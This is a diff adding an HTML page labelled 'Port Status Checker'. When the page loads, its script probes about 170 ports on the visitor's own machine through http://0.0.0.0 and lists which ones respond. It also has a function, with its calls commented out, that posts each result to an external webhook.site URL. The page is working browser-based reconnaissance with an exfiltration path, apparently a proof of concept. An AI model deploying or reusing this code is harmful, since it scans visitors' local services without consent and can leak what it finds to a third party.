@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Port Status Checker</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        .status {
+            margin: 10px 0;
+            white-space: pre-wrap; /* Preserve whitespace and line breaks in response data */
+        }
+        .error {
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <h1>Port Status Checker</h1>
+    <div id="statusContainer"></div>
+
+    <script>
+	    
+	    const ports = [80,443,8000,8050,9090,10000,1090,1098,1099,11211,1199,135,139,1760,21,2181,2195,22,2222,23,2375,2376,25,27017,2888,3000,3269,3306,3389,3407,3443,3888,389,4011,4243,4443,4444,4445,4446,445,465,5000,5001,50010,5002,50030,50060,50070,50075,50100,50111,50470,50475,5081,51111,5223,5228,5229,5230,5235,5236,5252,5432,5601,5672,587,5985,5986,60000,60010,60020,60030,6060,61,61616,62,63,6301,636,6379,6443,69,6969,7000,7080,7199,7272,7333,8000,8009,8020,8021,8027,8040,8041,8045,8047,8048,8055,8056,8057,8058,8061,8080,8081,8085,8086,8090,8096,8179,8180,8181,8365,8383,8384,8400,8443,8444,8445,8446,8449,8480,8481,8485,8651,8660,8686,8881,8888,8999,9000,9001,9002,9003,9004,9005,9006,9007,9008,9009,9010,9020,9042,9083,9090,9091,9092,9096,9160,9163,9200,9201,9230,9251,9300,9301,9365,9400,9418,9443,9864,9865,9866,9867,9868,9869,9870,9871,9875,9999];
+        const baseURL = 'http://0.0.0.0:';
+        const statusContainer = document.getElementById('statusContainer');
+        const webhookURL = 'http://webhook.site/4e0e365a-b7ff-4047-bef2-5e8549c09535';
+
+        // Function to make POST request
+        function postStatus(port, status, statusCode) {
+            return fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ port, status, statusCode })
+            })
+            .then(response => response.text())
+            .then(result => {
+                console.log(`POST request successful: ${result}`);
+            })
+            .catch(error => {
+                console.error(`POST request error: ${error}`);
+            });
+        }
+
+        // Function to make GET request to a specific port
+        function checkPort(port) {
+            return fetch(baseURL + port, { mode: 'no-cors' })
+                .then(response => {
+                    // With no-cors mode, response.body is inaccessible
+                    const statusCode = response.status; // Status code is accessible
+                    const statusMessage = `http://0.0.0.0:${port} status-Request sent with no-cors mode. Unable to access response data.`;
+                    // Make a POST request with port, status, and status code
+                   // postStatus(port, statusMessage, statusCode);
+                    return statusMessage;
+                })
+                .catch(error => {
+                    // Catch and display any errors that occur during the fetch
+                    const statusCode = 'Error'; // Status code is not available in case of fetch errors
+                    const errorMessage = `http://0.0.0.0:${port} status-Error - ${error.message}`;
+                    console.error(errorMessage);
+                    // Make a POST request with port, status, and error message
+                    //postStatus(port, errorMessage, statusCode);
+                    return errorMessage;
+                });
+        }
+
+        // Function to update the page with the status of each port
+        function updateStatus() {
+            let requests = ports.map(port => checkPort(port));
+            
+            Promise.all(requests).then(results => {
+                results.forEach(result => {
+                    const div = document.createElement('div');
+                    div.className = 'status';
+                    div.textContent = result;
+                    if (result.includes('status-Error')) {
+                        div.classList.add('error');
+                    }
+                    statusContainer.appendChild(div);
+                });
+            });
+        }
+
+        // Start checking ports
+        updateStatus();
+    </script>
+</body>
+</html>
